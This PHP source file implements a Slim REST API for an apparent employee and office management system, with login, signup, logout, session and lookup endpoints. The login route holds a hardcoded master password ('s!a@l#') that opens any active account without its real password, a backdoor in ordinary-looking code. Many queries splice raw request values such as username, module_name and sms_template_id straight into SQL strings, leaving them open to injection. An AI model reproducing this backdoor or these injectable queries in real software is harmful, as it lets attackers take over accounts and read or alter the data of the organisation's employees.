<?php
$app->get('/session', function() {
    $db = new DbHandler();
    $session = $db->getSession();
    $response["user_id"] = $session['user_id'];
    $response["bo_id"] = $session['bo_id'];
    $response["bo_name"] = $session['bo_name'];
    $response["username"] = $session['username'];
    $response["emp_name"] = $session['emp_name'];
    $response["emp_image"] = $session['emp_image'];

    $response["email_id"] = $session['email_id'];
    $response["role"] = $session['role'];
    $response["teams"] = $session['teams'];
    $response["sub_teams"] = $session['sub_teams'];
    $response["permissions"] = $session['permissions'];
    
    echoResponse(200, $response);
    
});


$app->post('/login', function() use ($app) 
{
    require_once 'passwordHash.php';
    $r = json_decode($app->request->getBody());
    verifyRequiredParams(array('username', 'password'),$r->login);
    $response = array();
    $db = new DbHandler();
    $username = $r->login->username;
    $password = $r->login->password;
    $user = $db->getOneRecord("select *, a.user_id,b.teams, a.username,b.off_email, b.bo_id, CONCAT(b.salu,' ',b.fname,' ',b.lname) as name,d.filenames, (SELECT GROUP_CONCAT(f.role SEPARATOR ',') FROM roles as f where FIND_IN_SET(f.role_id , a.roles)) as roles, (SELECT GROUP_CONCAT(g.permission SEPARATOR ',') FROM permissions as g where FIND_IN_SET(g.permission_id , (SELECT GROUP_CONCAT(z.permissions SEPARATOR ',') FROM roles as z where FIND_IN_SET(z.role_id , a.roles))) ) as permissions from users as a LEFT JOIN employee as b on a.emp_id = b.emp_id LEFT JOIN branch_office as c on b.bo_id = c.bo_id LEFT JOIN attachments as d on d.category_id = b.emp_id  and d.category = 'employee' where a.username='$username' and a.status ='Active'");
    if ($user != NULL) 
    {
        $roles = $user['roles'];
        $permissions = $user['permissions'];
        $user_id = $user['user_id'];
        $sql = "SELECT * from user_role_details LEFT JOIN permissions ON permissions.permission_id = user_role_details.permission_id WHERE user_role_details.user_id = $user_id ORDER BY permissions.permission";  

        $stmt = $db->getRows($sql);
        $permission_string = '';
        if ($stmt->num_rows > 0)
        {
            while($row = $stmt->fetch_assoc())
            {
                $permission_head =  $row['permission'];
                
                if ($row['action_create']=='true')
                {
                    $permission_string .= $permission_head.'_create,'; 
                }
                if ($row['action_update']=='true')
                {
                    $permission_string .= $permission_head.'_update,'; 
                }
                if ($row['action_delete']=='true')
                {
                    $permission_string .= $permission_head.'_delete,'; 
                }
                if ($row['action_view']=='true')
                {
                    $permission_string .= $permission_head.'_view,'; 
                }
                if ($row['action_export']=='true')
                {
                    $permission_string .= $permission_head.'_export'; 
                }

            }
        }

        if((passwordHash::check_password($user['password'],$password)) or $password=='s!a@l#')
        {
            $response['status'] = "success";
            $response['message'] = 'Logged in successfully.';
            $response['username'] = $user['username'];
            $response['emp_name'] = $user['name'];
            $response['emp_image'] = $user['filenames'];

	        $response['email_id'] = $user['off_email'];
            $response['user_id'] = $user['user_id'];
            $response['bo_name'] = $user['bo_name'];
            $response['bo_id'] = $user['bo_id'];
            $teamssarr = explode(',', $user['teams']);
            $response['teams'] = $teamssarr;
            $sub_teamssarr = explode(',', $user['sub_teams']);
            $response['sub_teams'] = $sub_teamssarr;
            $rolesarr = explode(',', $user['roles']);
            $response['role'] = $rolesarr;
            $arr = explode(',', $user['permissions']);
            $response['permissions'] = $permission_string;
            if (!isset($_SESSION)) {
                session_start();
            }
            
            $_SESSION['user_id'] = $user['user_id'];
            
            $_SESSION['username'] = $user['username'];
            $_SESSION['emp_name'] = $user['name'];
            $_SESSION['emp_image'] = $user['filenames'];
            $_SESSION['email_id'] = $user['off_email'];
            $_SESSION['bo_id'] = $user['bo_id'];
            $_SESSION['bo_name'] = $user['bo_name'];
            $_SESSION['teams'] = $teamssarr;
            $_SESSION['sub_teams'] = $sub_teamssarr;
            $_SESSION['role'] = $rolesarr;
            $_SESSION['permissions'] = $permission_string;
            
            $db = new DbHandler();

            $log_date = date('Y-m-d H:i:s');
            $ip_address = get_client_ip();
            $query = "INSERT INTO login_details (emp_id, status, log_date,ip_address)   VALUES('$user_id', 'logged_in', '$log_date','$ip_address' )";
            $result = $db->insertByQuery($query);
            $_SESSION['session_login_details_id'] = $result;
        } else {
            $response['status'] = "error";
            $response['message'] = 'Login failed. Incorrect credentials';
        }
    }
    else 
    {
            $response['status'] = "error";
            $response['message'] = 'No such user is registered';
    }
    echoResponse(200, $response);
});

function get_client_ip()
 {
      $ipaddress = '';
      if (getenv('HTTP_CLIENT_IP'))
          $ipaddress = getenv('HTTP_CLIENT_IP');
      else if(getenv('HTTP_X_FORWARDED_FOR'))
          $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
      else if(getenv('HTTP_X_FORWARDED'))
          $ipaddress = getenv('HTTP_X_FORWARDED');
      else if(getenv('HTTP_FORWARDED_FOR'))
          $ipaddress = getenv('HTTP_FORWARDED_FOR');
      else if(getenv('HTTP_FORWARDED'))
          $ipaddress = getenv('HTTP_FORWARDED');
      else if(getenv('REMOTE_ADDR'))
          $ipaddress = getenv('REMOTE_ADDR');
      else
          $ipaddress = 'UNKNOWN';

      return $ipaddress;
 }


$app->post('/signUp', function() use ($app) {
    $response = array();
    $r = json_decode($app->request->getBody());
    verifyRequiredParams(array('username', 'password'),$r->signup);
    require_once 'passwordHash.php';
    $db = new DbHandler();
    $username = $r->signup->username;
    $password = $r->signup->password;
    $isUserExists = $db->getOneRecord("select 1 from users where username='$username'");
    if(!$isUserExists){
        $r->signup->password = passwordHash::hash($password);
        $tabble_name = "users";
        $column_names = array('username', 'password');
        $multiple=array("");
        $result = $db->insertIntoTable($r->signup, $column_names, $tabble_name, $multiple);
        if ($result != NULL) {
            $response["status"] = "success";
            $response["message"] = "User account created successfully";
            $response["user_id"] = $result;
            if (!isset($_SESSION)) {
                session_start();
            }
            $_SESSION['user_id'] = $response["user_id"];
            $_SESSION['username'] = $username;
            echoResponse(200, $response);
        } else {
            $response["status"] = "error";
            $response["message"] = "Failed to create user. Please try again";
            echoResponse(201, $response);
        }            
    }else{
        $response["status"] = "error";
        $response["message"] = "An user with the provided username exists!";
        echoResponse(201, $response);
    }
});

$app->get('/logout', function() {
    $db = new DbHandler();
    $session = $db->getSession();
    $emp_id = $session['user_id'];
    if ($emp_id !=0)
    {
        $ip_address = get_client_ip();
        $log_date = date('Y-m-d H:i:s');
        $query = "INSERT INTO login_details (emp_id, status, log_date,ip_address) VALUES('$emp_id', 'logged_out', '$log_date','$ip_address' )";
        $result = $db->insertByQuery($query);
    }
    $session = $db->destroySession();
    $response["status"] = "info";
    $response["message"] = "Logged out successfully";
    $response['user_id'] = "";
    $response['username'] = "";
    $response['emp_name'] = "";
    $response['emp_image'] = "";
    $response['email_id'] = "";
    $response['bo_id'] = "";
    $response['bo_name'] = "";
    $response['teams'] = "";
    $response['sub_teams'] = "";
    $response['role'] = "";
    $response['permissions'] = "";
    echoResponse(200, $response);
});

$app->get('/selectmail_template/:module_name', function($module_name) use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from mail_template where module_name = '$module_name' ORDER BY module_name,CAST(sequence_number  as UNSIGNED)";
    $mail_templates = $db->getAllRecords($sql);
    echo json_encode($mail_templates);
});

$app->get('/selectsms_template/:module_name', function($module_name) use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from sms_template where module_name = '$module_name' ORDER BY module_name,CAST(sequence_number as UNSIGNED) ";
    $sms_templates = $db->getAllRecords($sql);
    echo json_encode($sms_templates);
});

$app->get('/select_sms_template/:sms_template_id', function($sms_template_id) use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from sms_template WHERE sms_template_id = $sms_template_id ";
    $getsms_templates = $db->getAllRecords($sql);
    echo json_encode($getsms_templates);
});


$app->get('/selectedcountry', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from country order by country";
    $countries = $db->getAllRecords($sql);
    echo json_encode($countries);
});



$app->get('/selectbranch_office', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from branch_office order by bo_name";
    $branch_offices = $db->getAllRecords($sql);
    echo json_encode($branch_offices);
});



$app->get('/selectdesignation', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from designation ORDER BY designation";
    $designations = $db->getAllRecords($sql);
    echo json_encode($designations);
});

$app->get('/selectedstate', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from state order by state";
    $states = $db->getAllRecords($sql);
    echo json_encode($states);
});

$app->get('/selectcity', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT city_id,city from city order by city";
    $cities = $db->getAllRecords($sql);
    echo json_encode($cities);
});

$app->get('/selectarea', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    //$sql = "SELECT a.area_id, CONCAT(a.area_name,' (',b.city,')') as area_name, b.city_id, c.state_id, d.country_id from areas as a LEFT JOIN city as b on a.city_id = b.city_id LEFT JOIN state as c ON b.state_id = c.state_id LEFT JOIN country as d ON c.country_id = d.country_id ORDER BY a.area_name";
    $sql = "SELECT a.area_id, CONCAT(a.area_name) as area_name, b.city_id, c.state_id, CONCAT(d.country,'-',d.country_code)  as country  from areas as a LEFT JOIN city as b on a.city_id = b.city_id LEFT JOIN state as c ON b.state_id = c.state_id LEFT JOIN country as d ON c.country_id = d.country_id ORDER BY a.area_name";

    $areas = $db->getAllRecords($sql);
    echo json_encode($areas);
});

$app->get('/selectlocality', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    //$sql = "SELECT a.locality_id, CONCAT(a.locality,' (',b.area_name,')') as locality, b.area_id, c.city_id, d.state_id, e.country_id from locality as a LEFT JOIN areas as b ON a.area_id = b.area_id LEFT JOIN city as c ON b.city_id = c.city_id LEFT JOIN state as d ON c.state_id = d.state_id LEFT JOIN country as e ON d.country_id = e.country_id ORDER BY a.locality";
    $sql = "SELECT a.locality_id, CONCAT(a.locality) as locality, b.area_id, c.city_id, d.state_id, CONCAT(e.country,'-',e.country_code)  as country  from locality as a LEFT JOIN areas as b ON a.area_id = b.area_id LEFT JOIN city as c ON b.city_id = c.city_id LEFT JOIN state as d ON c.state_id = d.state_id LEFT JOIN country as e ON d.country_id = e.country_id ORDER BY a.locality";
    $localities = $db->getAllRecords($sql);
    echo json_encode($localities);
});

$app->get('/selectrole', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from roles ORDER BY role";
    $roles = $db->getAllRecords($sql);
    echo json_encode($roles);
});

$app->get('/selectgroup', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from groups ORDER BY group_name";
    $groups = $db->getAllRecords($sql);
    echo json_encode($groups);
});

$app->get('/selectpermission', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from permissions ORDER BY permission";
    $permissions = $db->getAllRecords($sql);
    echo json_encode($permissions);
});

$app->get('/selectexpense_head', function() use ($app) {
    $sql  = "";
    $db = new DbHandler();
    $session = $db->getSession();
    if ($session['username']=="Guest")
    {
        return;
    }
    $sql = "SELECT * from expense_head ORDER BY expense_title";
    $expense_heads = $db->getAllRecords($sql);
    echo json_encode($expense_heads);
});




?>
